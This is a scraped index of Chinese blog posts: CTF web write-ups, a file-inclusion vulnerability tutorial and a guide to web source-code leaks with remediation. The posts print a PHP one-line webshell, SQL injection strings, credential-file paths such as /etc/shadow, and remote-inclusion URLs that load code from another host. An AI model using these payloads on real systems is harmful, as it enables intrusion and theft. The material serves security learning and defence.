file&quot;; } ?&gt; &lt;/body&gt; &lt;/html&gt; 代码审计一下：黑名单，文件类型只能是image/gif、image/jpeg、image/pjpeg。所以，先将php一句话，文件后缀改为.jpg。上传、抓包，将.jpg改为.php。上传成功蚁剑(菜刀)一连，连接成功没有发现flag，发现了config.php。打开，里面有数据库用户名、密码、数据库名。蚁剑连接数据库，得到flag Web10：Login打开题目查看源码，在最下方发现应该就是用户名和密码，登录只有这个。。。源码也没有有用信息抓包，发包响应头里发现特殊的东西show，且值为0。一般0表示假，1为真。所以在请求头里将show的值写为1，发包得到源码 &lt;?php include &#39;common.php&#39;; $requset = array_merge($_GET, $_POST, $_SESSION, $_COOKIE); class db { public $where; function __wakeup() { if(!empty($this-&gt;where)) { $this-&gt;select($this-&gt;where); } } function select($where) { $sql = mysql_query(&#39;select * from user where &#39;.$where); return @mysql_fetch_array($sql); } } if(isset($requset[&#39;token&#39;])) { $login = unserialize(gzuncompress(base64_decode($requset[&#39;token&#39;]))); $db = new db(); $row = $db-&gt;select(&#39;user=\\&#39;&#39;.mysql_real_escape_string($login[&#39;user&#39;]).&#39;\\&#39;&#39;); if($login[&#39;user&#39;] === &#39;ichunqiu&#39;) { echo $flag; }else if($row[&#39;pass&#39;] !== $login[&#39;pass&#39;]){ echo &#39;unserialize injection!!&#39;; }else{ echo &quot;(╯‵□′)╯︵┴─┴ &quot;; } }else{ header(&#39;Location: index.php?error=1&#39;); } ?&gt; 审计代码，发现只要$login = unserialize(gzuncompress(base64_decode(requset[′token′])))之后，requset[′token′])))之后，login[‘user’] === &#39;ichunqiu’即可。然后写到cookie中的token中就行了，这个时候也必须有show: 1，发包得到flag。 写在后面就先总结这么多。。。。","categories":[{"name":"CTF","slug":"CTF","permalink":"https://qwzf.github.io/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://qwzf.github.io/tags/CTF/"},{"name":"Web","slug":"Web","permalink":"https://qwzf.github.io/tags/Web/"},{"name":"i春秋","slug":"i春秋","permalink":"https://qwzf.github.io/tags/i春秋/"}],"author":"qwzf"},{"title":"南邮-Web(二)","slug":"南邮-Web(二)","date":"2019-08-25T10:31:58.716Z","updated":"2019-08-25T11:48:41.025Z","comments":true,"path":"2019/08/25/南邮-Web(二)/","link":"","permalink":"https://qwzf.github.io/2019/08/25/南邮-Web(二)/","excerpt":"","text":"前言最近又做了南邮的Web题，发现有的题崩了。不过已经把未崩的Web题做完了，再次总结一下 Web15：伪装者题目没有提示。点进去发现发现只能本地登录，才能得到flag。所以进行IP欺骗，即可得到flag。一般情况下是XFF(X-Forwarded-For)请求伪造。不过这道题试过之后，发现并没有什么用。查询百度：IP欺骗(XFF头等)由此，可以使用Client-IP: 127.0.0.1进行本地IP欺骗。伪造之后，Forword发包，得到flag Web16：Header发现题崩了，不过我下载过源码，所以本地搭建做一下根据题目描述，很明显想到http请求头和响应头。截包发现flag在响应头里 Web17：上传绕过由题目描述，可以知道这道题考察的是文件上传漏洞。因为之前总结过，所以直接开始做题。先随便上传一个文件，发现要求上传php后缀的文件然后写一个php的一句话木马： &lt;?php @eval($_POST[&#39;a&#39;]); ?&gt; 再上传php文件绕过思路：先将webshell.php的.php后缀改为.png。然后上传该png文件，绕过黑名单，再将.png后缀变为.php。最后再去掉.php由此想到了00截断进行绕过，并且是POST型的。先上传webshell.png，在/uploads/后加上webshell.php+空格然后将空格0x20改为0x00forward发包，得到flag Web18：SQL注入1根据题目描述，很明显是SQL注入。点击Source，查看源码发现当SQL查询有返回值，且user=”admin”时，即可得到flag。并且闭合方式为&#39;)所以构造payload： admin&#39;)# Web19：pass check strcmp() 函数 strcmp() 函数比较两个字符串。strcmp() 函数是二进制安全的，且区分大小写。 该函数返回： 0 - 如果两个字符串相等&lt;0 - 如果 string1 小于 string2&gt;0 - 如果 string1 大于 string2 代码审计一下：1、post传参，且参数变量为pass，赋值给变量$pass。变量$pass1的值被隐藏。2、如果设置了$pass，且strcmp() 函数返回0，即可得到flag。3、要使strcmp() 函数返回0。可以$pass==$pass1，也可以strcmp(array,string)=null=04、所以使strcmp返回NULL就可以得到flag Web20：起名字真难ord()函数代码审计一下：1、get传参，参数值通过自定义函数进行检查，对参数值的每一位进行检查。2、如果ascii码&gt;=1的ascii且&lt;=9的ascii，返回false。即题目要求不能输入1-9数字，3、但是输入的字符串必须和54975581388相同4、所以可以用和54975581388等值的16进制表示(利用了php的弱类型的特性)10进制转16进制get传参，得到flag Web21：密码重置题目提示账号为admin，要进行密码重置。打开题目账号无法修改，只能重置账号ctfuser。所以抓包修改发现Y3RmdXNlcg==比较特殊，是Base64加密的，解密结果发现是ctfuser所以想着把admin进行Base64加密，Y3RmdXNlcg==替换成admin加密结果Forward发包，得到flag Web22：php 反序列化反序列化？！还好已经学习过。审计代码，开始做题代码审计一下：1、stripslashes()函数的作用是删除反斜杠，代码的意思是如果添加了反斜杠，则将反斜杠\\删除。 if(get_magic_quotes_gpc()){ $pass=stripslashes($pass); } 2、然后将pass进行反序列化操作，并赋值给变量o。 $o = unserialize($pass)； 3、如果对象o赋值成功，将对象o的secret变量设置为*，并判断对象o的secret变量和enter变量是否相等，===判断数值及属性，如果相等输出flag。 if ($o) { $o-&gt;secret = &quot;*&quot;; if ($o-&gt;secret === $o-&gt;enter) echo &quot;Congratulation! Here is my secret: &quot;.$o-&gt;secret; else echo &quot;Oh no... You can&#39;t fool me&quot;; } 不知道secret的值。所以我们想到了引用a=&amp;b，即PHP对象深浅拷贝构造POC(在初始化的时候将$this-&gt;enter=&amp;$this-&gt;secret进行引用)： &lt;?php class just4fun { var $enter; var $secret; function just4fun() { $this-&gt;enter=&amp;$this-&gt;secret; } } echo serialize(new just4fun()); ?&gt; 得到序列化字符串O:8:&quot;just4fun&quot;:2:{s:5:&quot;enter&quot;;N;s:6:&quot;secret&quot;;R:2;}构造payload得到flag(N表示NULL，R表示对象引用)：提交flag发现不对，因为题有问题。。。。。。。PHP序列化格式详解：a - arrayb - booleand - doublei - integero - common objectr - references - stringC - custom objectO - classN - nullR - pointer referenceU - unicode string Web23：SQL Injection题目提示：反斜杠可以用来转义，仔细查看相关函数的用法打开题目，查看源码magic_quotes_gpc函数在php中的作用是判断解析用户提示的数据，如包括有：post、get、cookie过来的数据增加转义字符“\\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的错误。单引号（’）、双引号（”）、反斜线（\\）与 NULL（NULL 字符）等字符都会被加上反斜线。这些转义是必须的，如果这个选项为Off，那么我们就必须调用addslashes这个函数来为字符串增加转义。stripslashes() 函数删除反斜杠htmlentities() 函数把字符转换为 HTML 实体 htmlentities($str, ENT_COMPAT); // 只转换双引号 htmlentities($str, ENT_QUOTES); // 转换双引号和单引号 htmlentities($str, ENT_NOQUOTES); // 不转换任何引号 代码审计一下：1、传入GET类型的username以及password，首先调用了clean方法2、clean方法首先判断是否开启了添加反斜杠，如果添加了，使用stripslashes()删除反斜杠，然后调用htmlentities()方法将把字符转换为 HTML 实体,htmlentities($str, ENT_QUOTES); // 转换双引号和单引号3、因为带反斜杠的单引号，被转义为字符了，无法参与闭合操作。下一步考虑的是将单引号闭合4、可以通过反斜杠对单引号进行转义。当我们输入username=admin&amp;password=123时，会将username后的单引号进行转义，构造语句如下： SELECT * FROM users WHERE name=&lt;font color=#FF0000 size=3&gt;&#39;&lt;/font&gt;admin&#39; AND pass=&lt;font color=#FF0000 size=3&gt;&#39;&lt;/font&gt;123&#39; 所以将第一个单引号和第三个单引号进行闭合。 SELECT * FROM users WHERE name=&lt;font color=#FF0000 size=3&gt;&#39;&lt;/font&gt;admin&#39; AND pass=&lt;font color=#FF0000 size=3&gt;&#39;&lt;/font&gt; or 1 #&#39; payload ?username=admin\\&amp;password=or 1 %23或 ?username=admin\\&amp;password=or 1=1--+ Web24：综合题题目描述没提示，查看题目我也不知道是什么玩意儿。不过之前做过颜文字aaencode，看着两者比较像，想着是不是可以用谷歌的Console，发现可以。不过还是了解一下这是什么编码。看大佬博客发现这是jsfuck编码。可使用浏览器控制台直接解密，也可使用在线JSfuck解密工具。访问得到的php文件提示：TIP在我脑袋里，在文件的header里发现了history of bash百度一下history of bash。发现在Unix中 , 会生成一个 .bash_history 的文件 , 记录了用户的操作历史尝试访问这个文件 :在bash_history中记录了执行压缩包的操作，所以我们访问以下flagbak.ziphttp://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/flagbak.zip开始自动下载文件，打开后得到flag！system题崩了。。。 Web25：SQL注入2题目提示union查询。打开题目，点击Source，查看源码strcasecmp() 函数strcasecmp(string1,string2)比较两个字符串。该函数返回： 0 - 如果两个字符串相等&lt;0 - 如果 string1 小于 string2&gt;0 - 如果 string1 大于 string2 代码审计一下：1、post传入user赋值给$user，传入pass经md5加密赋值给$pass2、$query等于查询pw字段返回结果。如果有返回值，则$query[pw]为ture，否则为false3、如果变量存在，并且，$pass与$query[pw]相等（不区分大小写）,输出flag所以考虑在$user上加上一个union语句，即向$query的结果集中在加一条。payload &#39; union select md5(123)#&amp;pass=123 Web26：密码重置2依旧是密码重置，题目有三条提示： 管理员邮箱观察一下就可以找到 linux下一般使用vi编辑器，并且异常退出会留下备份文件 弱类型bypass 查看源码，发现管理员邮箱百度一下，vi编辑器异常退出会留下的备份文件：第一次产生的交换文件名为“.file.txt.swp”；再次意外退出后，将会产生名为“.file.txt.swo”的交换文件；而第三次产生的交换文件则为“.file.txt.swn”；依此类推。由此再次查看源码发现submit.php，所以访问.submit.php.swp，得到验证源码代码审计一下：$token长度为10，数值为0，并且邮箱号和token不为空。所以输入刚才的管理员邮箱，token为0000000000最终，得到flag Web27：file_get_contents题目标题file_get_contents，想到之前学文件包含漏洞时遇到过file_get_contents() 函数把整个文件读入一个字符串中。打开题目查看源码传入一个文件，经file_get_contents() 函数把整个文件读入一个字符串中，如果字符串等于meizijiu，得到flag。想到了学文件包含漏洞时的php伪协议这里应该是php://input (读取POST数据)。file_get_contents(“php://input”)的使用方法php伪协议也是可以利用http协议的，即可以使用POST方式传数据 Web28：变量覆盖提示：变量覆盖打开题目，查看源码emmm。。。不会，查看大佬博客分析代码：可变变量key获取了一个普通变量value的值作为这个可变变量的变量名。使用foreach来遍历数组中的值，再将获取到的数组键名作为变量，数组中的键值作为变量的值。因此就产生了变量覆盖漏洞。通过地址栏进行GET传参，变量覆盖便形成了 $$key = $name $value = meizijiu233 $name == &quot;meizijiu233&quot; 所以得到flag","categories":[{"name":"CTF","slug":"CTF","permalink":"https://qwzf.github.io/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://qwzf.github.io/tags/CTF/"},{"name":"Web","slug":"Web","permalink":"https://qwzf.github.io/tags/Web/"},{"name":"南邮","slug":"南邮","permalink":"https://qwzf.github.io/tags/南邮/"}],"author":"qwzf"},{"title":"文件包含漏洞","slug":"文件包含漏洞","date":"2019-08-21T13:28:09.505Z","updated":"2020-08-01T16:47:13.266Z","comments":true,"path":"2019/08/21/文件包含漏洞/","link":"","permalink":"https://qwzf.github.io/2019/08/21/文件包含漏洞/","excerpt":"","text":"前言因为之前做过文件包含漏洞的Web题，了解了一点文件包含漏洞的一些知识，但并没有总结。所以现在重新学习并总结了一下文件包含漏洞。 文件包含漏洞文件包含的简介 服务器执行PHP文件时，可以通过文件包含函数加载另一个文件中的PHP代码，并且当PHP来执行，这会为开发者节省大量的时间。这意味着您可以创建供所有网页引用的标准页眉或菜单文件。当页眉需要更新时，您只更新一个包含文件就可以了，或者当您向网站添加一张新页面时，仅仅需要修改一下菜单文件（而不是更新所有网页中的链接）。 文件包含的原理 PHP中提供了四个文件包含的函数，分别是include()、include_once()、require()和require_once()。这四个函数都可以进行文件包含，但作用并不一样。 require：找不到被包含的文件时会产生致命错误，并停止脚本。 include：找不到被包含的文件时只会产生警告，脚本将继续执行。 include_once：和include()语句类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含。 require_once：和require()语句类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含。 文件包含的分类PHP中的文件包含分为本地包含和远程包含。1、本地包含 Local File Include (LFI) 1.所包含文件内容符合PHP语法规范：任何扩展名都可以被PHP解析。2.包含非PHP语法规范源文件，会暴露其源代码。 例如：test1.php代码如下： &lt;?php $a=&#39;abc&#39;; echo $a; ?&gt; test2.php代码如下： &lt;?php include(&quot;test1.php&quot;); ?&gt; 执行test2.php，会输出 abc。 如果test2.php包含的是一个 txt文件，并且这个txt文件内容符合php语法规则，则txt文件会被当成php文件执行。如果包含非php语法规则的内容，则会暴露其源代码。 2、远程包含 Remote File Include (RFI)如果要使用远程包含功能，首先需要确定PHP是否已经开启远程包含功能选项（php默认关闭远程包含功能：allow_url_include=off），开启远程包含功能需要在php.ini配置文件中修改。 远程包含与本地包含没有区别，无论是哪种扩展名，只要遵循PHP语法规范，PHP解析器就会对其解析。 例如：创建abc.txt文件，文件内容符合PHP语法规则。我们将test2.php的内容修改为： &lt;?php include($_GET[&#39;page&#39;]); ?&gt; 此时，在url中输入：http://www.XXXX.com/test2.php?page=http://www.XXXX.com/abc.txt将会执行abc.txt的内容。 文件包含漏洞的成因 在包含文件时候，为了灵活包含文件，将被包含文件设置为变量，通过动态变量来引入需要包含的文件时，用户可以对变量的值可控而服务器端未对变量值进行合理地校验或者校验被绕过，这样就导致了文件包含漏洞。通常文件包含漏洞出现在PHP语言中。例如： &lt;?php $filename = $_GET[&#39;filename&#39;]; include($filename); ?&gt; $_GET[&#39;filename&#39;]参数开发者没有经过严格的过滤，直接带入了include的函数，攻击者可以修改$_GET[&#39;filename&#39;]的值，执行非预期的操作。 文件包含漏洞的危害 通过文件包含漏洞，可以读取系统中的敏感文件，源代码文件等，如密码文件，通过对密码文件进行暴力破解。若破解成功则可获取操作系统的用户账户，甚至可通过开放的远程连接服务进行连接控制。另外不管是本地文件包含还是远程文件包含，文件包含漏洞还可能导致执行任意代码。 文件包含漏洞分类1、本地文件包含漏洞 当包含的文件在服务器本地时，就形成了本地文件包含。 1.无限制本地文件包含漏洞测试代码： &lt;?php $filename = $_GET[&#39;filename&#39;]; include($filename); ?&gt; 测试结果：通过目录遍历漏洞可以获取到系统中其他文件的内容。 常见的敏感信息路径：Windows系统 c:\\boot.ini // 查看系统版本c:\\windows\\system32\\inetsrv\\MetaBase.xml // IIS配置文件c:\\windows\\repair\\sam // 存储Windows系统初次安装的密码c:\\ProgramFiles\\mysql\\my.ini // MySQL配置c:\\ProgramFiles\\mysql\\data\\mysql\\user.MYD // MySQL root密码c:\\windows\\php.ini // php 配置信息 Linux/Unix系统 /etc/passwd // 账户信息/etc/shadow // 账户密码文件/usr/local/app/apache2/conf/httpd.conf // Apache2默认配置文件/usr/local/app/apache2/conf/extra/httpd-vhost.conf // 虚拟网站配置/usr/local/app/php5/lib/php.ini // PHP相关配置/etc/httpd/conf/httpd.conf // Apache配置文件/etc/my.conf // mysql 配置文件 2.session文件包含漏洞条件：session的存储位置可以获取。session存储位置的获取 1、通过phpinfo的信息可以获取到session的存储位置。通过phpinfo的信息，获取到session.save_path为/var/lib/php/sessions：2、 通过猜测默认的session存放位置进行尝试。 linux下默认存储在/var/lib/php/session(s)目录下。windows下(如果用的是phpstudy集成环境，且phpstudy在C盘根目录的话)默认存储在C:\\phpStudy\\PHPTutorial\\tmp\\tmp session中的内容可以被控制，传入恶意代码。示例代码： &lt;?php session_start(); $ctfs=$_GET[&#39;ctfs&#39;]; $_SESSION[&quot;username&quot;]=$ctfs; ?&gt; 漏洞分析 此php会将获取到的GET型ctfs变量的值存入到session中。当访问http://www.XXXX.com/LFI2.php?ctfs=ctfs 后，会在/var/lib/php/sessions目录下存储session的值。session的文件名为sess_+sessionid，sessionid可以通过开发者模式获取。所以session的文件名为sess_aisf1tieidskl22nlc4hqf60h5。到服务器的/var/lib/php/sessions目录下查看果然存在此文件，内容为：漏洞利用 通过上面的分析，可以知道ctfs传入的值会存储到session文件中，如果存在本地文件包含漏洞，就可以通过ctfs写入恶意代码到session文件中，然后通过文件包含漏洞执行此恶意代码getshell。 当访问http://www.XXXX.com/LFI2.php?ctfs=&lt;?php phpinfo();?&gt;后，会在/var/lib/php/sessions目录下存储session的值。本地查看是否存储成功攻击者通过phpinfo()信息泄露或者猜测能获取到session存放的位置，文件名称通过开发者模式可获取到，然后通过文件包含的漏洞解析恶意代码getshell。当然也可以把&lt;?php phpinfo();?&gt;换成一句话木马&lt;?php @eval($_POST[&#39;a&#39;]);?&gt;： 3.有限制本地文件包含漏洞测试代码： &lt;?php $filename = $_GET[&#39;filename&#39;]; include($filename . &quot;.html&quot;); ?&gt; 1、%00截断 条件：magic_quotes_gpc = Off php版本&lt;5.3.4测试结果： http://www.filename.com/LFI3.php?filename=phpinfo.php%00 2、路径长度截断 条件：windows OS，点号需要长于256；linux OS 长于4096 Windows下目录最大长度为256字节，超出的部分会被丢弃；Linux下目录最大长度为4096字节，超出的部分会被丢弃。 EXP： http://www.filename.com/LFI3.php?filename=test.txt/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././ 3、点号截断 条件：windows OS，点号需要长于256EXP： http://www.filename.com/LFI3.php?filename=test.txt................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................. 2、远程文件包含漏洞PHP的配置文件allow_url_fopen和allow_url_include设置为ON，include/require等包含函数可以加载远程文件，如果远程文件没经过严格的过滤，导致了执行恶意文件的代码，这就是远程文件包含漏洞。 allow_url_fopen = On(是否允许打开远程文件)allow_url_include =On(是否允许include/require远程文件) 1.无限制远程文件包含漏洞测试代码： &lt;?php $filename = $_GET[&#39;filename&#39;]; include($filename); ?&gt;测试结果：通过远程文件包含漏洞，包含php.txt可以解析。 http://www.filename.com/RFI1.php?filename=http://192.168.204.128/wenjian/php.txt 2.有限制远程文件包含漏洞测试代码： &lt;?php $filename = $_GET[&#39;filename&#39;]; include($filename . &quot;.html&quot;); ?&gt; 代码中多添加了html后缀，导致远程包含的文件也会多一个html后缀。 1、问号绕过 http://www.filename.com/RFI2.php?filename=http://192.168.204.128/wenjian/php.txt? 2、#号绕过 http://www.filename.com/RFI2.php?filename=http://192.168.204.128/wenjian/php.txt%23 还有哪些可以绕过？用burp跑一遍发现空格也可以绕过： 3、空格绕过 http://www.filename.com/RFI2.php?filename=http://192.168.204.128/wenjian/php.txt%20 使用windows环境(把测试代码放在windows的Web目录下)测试失败 4、%00截断 http://www.filename.com/RFI2.php?filename=http://192.168.204.128/wenjian/php.txt%00 同样，把php.txt文件内容换成一句话木马&lt;?php @eval($_POST[&#39;a&#39;]);?&gt;，可拿到webshell。 PHP伪协议PHP 带有很多内置 URL 风格的封装协议，可用于类似 fopen()、 copy()、 file_exists() 和 filesize() 的文件系统函数。 除了这些封装协议，还能通过 stream_wrapper_register() 来注册自定义的封装协议。 file:// — 访问本地文件系统http:// — 访问 HTTP(s) 网址ftp:// — 访问 FTP(s) URLsphp:// — 访问各个输入/输出流（I/O streams）zlib:// — 压缩流data:// — 数据（RFC 2397）glob:// — 查找匹配的文件路径模式phar:// — PHP 归档ssh2:// — Secure Shell 2rar:// — RARogg:// — 音频流expect:// — 处理交互式的流 php:// 输入输出流PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符， 内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。 php://filter(本地磁盘文件进行读取)元封装器，设计用于”数据流打开”时的”筛选过滤”应用，对本地磁盘文件进行读写。用法： ?filename=php://filter/convert.base64-encode/resource=xxx.php?filename=php://filter/read=convert.base64-encode/resource=xxx.php 两者效果一样。条件：只是读取，需要开启 allow_url_fopen，不需要开启 allow_url_include；测试代码： &lt;?php $filename = $_GET[&#39;filename&#39;]; include($filename); ?&gt; 测试结果：php://input可以访问请求的原始数据的只读流。即可以直接读取到POST上没有经过解析的原始数据。 enctype=”multipart/form-data” 的时候 php://input 是无效的。用法：?file=php://input 数据利用POST传过去。 php://input (读取POST数据)碰到file_get_contents()就要想到用php://input绕过，因为php伪协议也是可以利用http协议的，即可以使用POST方式传数据，具体函数意义下一项；测试代码： &lt;?php echo file_get_contents(&quot;php://input&quot;); ?&gt; 测试结果： php://input(写入木马)测试代码： &lt;?php $filename = $_GET[&#39;filename&#39;]; include($filename); ?&gt; 条件：php配置文件中需同时开启 allow_url_fopen 和 allow_url_include（PHP &lt; 5.3.0）,就可以造成任意代码执行，在这可以理解成远程文件包含漏洞（RFI），即POST过去PHP代码，即可执行。如果POST的数据是执行写入一句话木马的PHP代码，就会在当前目录下写入一个木马。","categories":[{"name":"漏洞原理","slug":"漏洞原理","permalink":"https://qwzf.github.io/categories/漏洞原理/"},{"name":"文件包含漏洞","slug":"漏洞原理/文件包含漏洞","permalink":"https://qwzf.github.io/categories/漏洞原理/文件包含漏洞/"}],"tags":[{"name":"漏洞利用","slug":"漏洞利用","permalink":"https://qwzf.github.io/tags/漏洞利用/"},{"name":"漏洞基础","slug":"漏洞基础","permalink":"https://qwzf.github.io/tags/漏洞基础/"},{"name":"漏洞绕过","slug":"漏洞绕过","permalink":"https://qwzf.github.io/tags/漏洞绕过/"},{"name":"PHP伪协议","slug":"PHP伪协议","permalink":"https://qwzf.github.io/tags/PHP伪协议/"}],"author":"qwzf"},{"title":"常见Web源码泄露","slug":"常见Web源码泄露","date":"2019-08-15T12:03:10.941Z","updated":"2020-08-01T16:44:42.802Z","comments":true,"path":"2019/08/15/常见Web源码泄露/","link":"","permalink":"https://qwzf.github.io/2019/08/15/常见Web源码泄露/","excerpt":"","text":"写在前面源码泄露漏洞成因把网站部署在某一个虚拟主机上面，然后把代码先打包压缩后上传，上传成功后再去服务器解压。虽然解决了上传速度慢的问题。但压缩包解压后如果没有删除，当攻击者发现后就可以把代码压缩包下载；因为部署到服务器上的都是源代码，这时候攻击者就可以通过代码进一步挖掘一些安全漏洞：文件上传，SQL 注入等等。 0x01 .git源码泄漏当在一个空目录执行 git init 时，Git 会创建一个 .git 目录。 这个目录包含所有的 Git 存储和操作的对象。 如果想备份或复制一个版本库，只需把这个目录拷贝至另一处就可以了。该目录的结构： HEAD config* description hooks/ info/ objects/ refs/ description 文件仅供 GitWeb 程序使用，无需关心。 config 文件包含项目特有的配置选项； info 目录包含一个全局性排除(global exclude)文件，用以放置不希望被记录在 .gitignore文件中的忽略模式(ignored patterns)； hooks 目录包含客户端或服务端的钩子脚本(hook scripts) 下面的四个很重要： HEAD 文件指示目前被检出的分支； index 文件保存暂存区信息； objects 目录存储所有数据内容； refs 目录存储指向数据(分支)的提交对象的指针。 1、漏洞成因 在发布代码的时候，如果没有把 .git 这个目录删除，直接发布到了运行目录中。攻击者就可以通过这个文件夹，可以用来恢复源代码。eg： http://www.example.com/.git/ 2、漏洞利用 常规利用下载整个目录, 然后用git命令回滚整个项目: wget -r --no-parent --mirror http://www.example.com/.git cd www.example.com &amp;&amp; git reset --hard 工具GitHack GitHack.py http://www.example.com/.git/ dvcs-ripper rip-git.pl -v -u http://www.example.com/.git/ 3、修复建议 1.删除.git2.在Nginx添加中URL重写判断来禁止访问这个.git目录下的内容： rewrite ^/.git/ http://www.example.com/; #Fix git issues 配置WEB服务器(apache/nginx等)来拒绝对.git路径的访问, 但也会出现被意外绕过的风险.最好的办法就是在项目新建一个www目录来存放源代码文件. 0x02 .hg源码泄漏Mercurial的意思是水银，所以缩写成hg(汞), 也是一个版本管理软件.。用法和git有点类似,，但也保留了svn命令简明的特点，而且原生地支持Windows/MacOS/Linux三大平台， 不像git需要MinGW才得以运行,，所以当今也有不少人偏向于用hg做版本控制。 1、漏洞成因 hg init的时候会生成.hgeg： http://www.example.com/.hg/ 2、漏洞利用 工具dvcs-ripper rip-hg.pl -v -u http://www.example.com/.hg/ 3、修复建议 删除.hg 0x03 .svn源码泄漏SVN 是 Subversion 的简称，是一个开放源代码的版本控制系统，相较于 RCS、CVS，它采用了分支管理系统，它的设计目标就是取代 CVS。互联网上很多版本控制服务已从 CVS 迁移到 Subversion。很多网站都使用了SVN版本控制系统，和使用 git 版本控制器类似。 1、漏洞成因 在使用SVN管理本地代码过程中，会自动生成一个名为.svn的隐藏文件夹，其中包含重要的源代码信息。但开发者在发布代码时，不愿意使用‘导出’功能，而是直接复制代码文件夹到WEB服务器上，这就使.svn隐藏文件夹被暴露于外网环境。 攻击者可以借助其中包含的用于版本信息追踪的entries文件，逐步摸清站点结构，并且也可以使用工具 dvcs-ripper下载网站源码。eg： http://www.example.com/.svn/entries 2、漏洞利用 工具 dvcs-ripper rip-svn.pl -v -u http://www.example.com/.svn/ Seay SVN 3、修复建议 1.在web服务器配置文件中增加一段代码，过滤到.svn文件，返回404nginx服务器： location ~ ^(.*)\\/\\.svn\\/ { return 404; } 重启nginxApache服务器： Order allow,deny Deny from all 重启Apache 2.查找服务器上所有.svn隐藏文件夹，删除 以下命令删除当前目录下.svn文件夹 find . -type d -name &quot;.svn&quot;|xargs rm -rf rm -rf `find . -type d -name .svn` find . -name &quot;.svn&quot; -type d | xargs rm -fr find . -name &quot;.svn&quot; -type d | xargs -n1 rm -R 使用脚本删除 #!/bin/sh cd /home/web/ find ./ -name &quot;.svn&quot; |xargs -n1 echo &gt; /dev/null 2&gt;&amp;1 find ./ -name &quot;.svn&quot; -print0 | xargs -0 rm -fr if [ $? -ne 0 ]; then echo &quot;remove .svn dirs failed!&quot; fi 以上文件保存为.sh执行之后，会删除 /home/web目录及其子目录中 所有 .svn 隐藏文件夹。 3.在使用SVN时，严格使用导出功能。禁止直接复制代码 0x04 .CVS信息泄漏CVS是一个年代比较久远的版本控制系统, 通过它可以追踪源代码的历史变化记录，但是因为功能比较简单, 而且不支持分支, 所以很早前就被上面提到的svn替代了。 1、漏洞成因 cvs项目在初始化(cvs checkout project)的时候, 会在project目录下创建一个名为CVS的目录,其中保存了各个文件的修改和commit记录.。通过此目录可以获取代码的历史版本.。其中两个关键文件为:CVS/Root和CVS/Entries, 分别记录了项目的根信息和所有文件的结构。 2、漏洞利用 测试的目录 http://url/CVS/Root 返回根信息 http://url/CVS/Entries 返回所有文件的结构 取回源码的命令 bk clone http://url/name dir 命令的意思就是把远端一个名为name的repo，clone到本地名为dir的目录下。查看所有的改变的命令，转到download的目录 bk changes 工具dvcs-ripper rip-cvs.pl -v -u http://www.example.com/CVS/ 3、修复建议 1.在目标服务器上删除CVS相关目录2.限制对CVS相关目录的访问。 0x05 .DS_Store文件泄漏.DS_Store 文件 MAC 系统是用来存储这个文件夹的显示属性的：比如文件图标的摆放位置。如果用户删除以后的副作用就是这些信息的失去。这些文件本来是给 Finder 使用的，但它们被设想作为一种更通用的有关显示设置的元数据存储，诸如图标位置和视图设置。 1、漏洞成因 当需要把代码上传的时候，安全正确的操作应该把 .DS_Store 文件删除才正确。因为里面包含了一些目录信息，如果没有删除，攻击者通过 .DS_Store 可以知道这个目录里面所有文件名称，从而让攻击者掌握了更多的信息。 在发布代码时未删除文件夹中隐藏的 .DS_store，被发现后，获取了敏感的文件名等信息。攻击者可以利用访问 URL(http://www.example.com/.ds_store)的方式来判断，是否存在DS_store泄露，如果存在泄漏，使用工具dsstoreexp，就可以下载源码。 2、漏洞利用 工具dsstoreexp python ds_store_exp.py http://www.example.com/.DS_Store 3、修复建议 1.删除.Ds_Store文件* find . -name &#39;*.DS_Store&#39; -type f -delete 2.禁止.DS_Store文件的生成 defaults write com.apple.desktopservices DSDontWriteNetworkStores -bool TRUE 恢复.DS_Store文件的生成 defaults delete com.apple.desktopservices DSDontWriteNetworkStores git中对.DS_Store文件的操作 删除项目中的所有.DS_Store。这会跳过不在项目中的 .DS_Store 1.find . -name .DS_Store -print0 | xargs -0 git rm -f --ignore-unmatch 将 .DS_Store 加入到 .gitignore 2.echo .DS_Store &gt;&gt; ~/.gitignore 更新项目 3.git add --all 4.git commit -m &#39;.DS_Store banished!&#39; 0x06 .bzr源码泄露bzr，即Bazaar。也是个版本控制工具, 虽然不是很热门, 但它也是多平台支持, 并且有不错的图形界面,所以也有一些人认为bzr比git要好用。 1、漏洞成因 bzr在初始化项目时(bzr init/init-repo), 会在项目根目录产生名为.bzr的隐藏目录, 同样暴露了源代码和用户信息 2、漏洞利用 bzr revert命令 wget -r --no-parent --mirror http://www.example.com/.bzr cd www.example.com &amp;&amp; bzr revert工具dsstoreexp rip-bzr.pl -v -u http://www.example.com/.bzr/ 3、修复建议 删除.bzr文件(同.git) 0x07 网站备份压缩文件在网站的使用过程中，往往需要对网站中的文件进行修改、升级。此时就需要对网站整站或者其中某一页面进行备份。当备份文件或者修改过程中的缓存文件因为各种原因而被留在网站web目录下，而该目录又没有设置访问权限时，便有可能导致备份文件或者编辑器的缓存文件被下载，导致敏感信息泄露，给服务器的安全埋下隐患。 